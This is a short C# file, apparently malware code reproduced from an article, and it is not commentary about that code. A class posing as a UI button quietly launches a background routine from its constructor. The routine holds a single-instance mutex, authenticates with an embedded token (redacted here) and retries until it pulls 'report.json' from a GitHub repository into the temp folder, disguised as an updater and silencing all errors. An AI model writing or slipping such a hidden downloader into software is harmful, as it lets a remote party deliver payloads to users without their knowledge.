using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net.Http;
using System.Net.Http.Headers;
class WUIButton {
    public WUIButton()
    {
        Core m_core = new Core();
        Task.Run(() => m_core.Init());
    }
}

class Core {
    // The article redacts the embedded token. No credential is reconstructed.
    private readonly string token = "REDACTED";
    private static bool IsApplicationRunning(string path) => false;
    private readonly string owner = "Carol-White-Super";

    private readonly string repo = "cloud";

    private readonly string path = "db";

    private readonly string branch = "Main";

    private static Mutex appMutex;

    public async Task Init()
    {
        string name = "Global\\MyUniqueApplicationGuid-12345";
        appMutex = new Mutex(initiallyOwned: true, name, out var createdNew);
        if (!createdNew)
        {
            return;
        }
        string githubApiUrl = $"https://api.github.com/repos/{owner}/{repo}/contents/{path}/report.json?ref={branch}";
        string savePath = Path.Combine(Path.GetTempPath(), "report.json");
        bool downloaded = File.Exists(savePath);
        Random random = new Random();
        while (!downloaded) {
            try {
                    using HttpClient client = new HttpClient();
                    client.Timeout = TimeSpan.FromSeconds(30.0);
                    client.DefaultRequestHeaders.UserAgent.ParseAdd("MyUpdater");
                    client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", token);
                    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/vnd.github.raw"));
                    using (HttpResponseMessage response = await client.GetAsync(githubApiUrl))
                    {
                        response.EnsureSuccessStatusCode();
                        using FileStream fs = new FileStream(savePath, FileMode.Create, FileAccess.Write, FileShare.None);
                        await response.Content.CopyToAsync(fs);
                    }
                    downloaded = true;
            } catch { }
                if (!downloaded)
                {
                    await Task.Delay(TimeSpan.FromSeconds((double)random.Next(1, 5)));
                }
                if (File.Exists(savePath))
                {
                    break;
                }
            }
    }
}
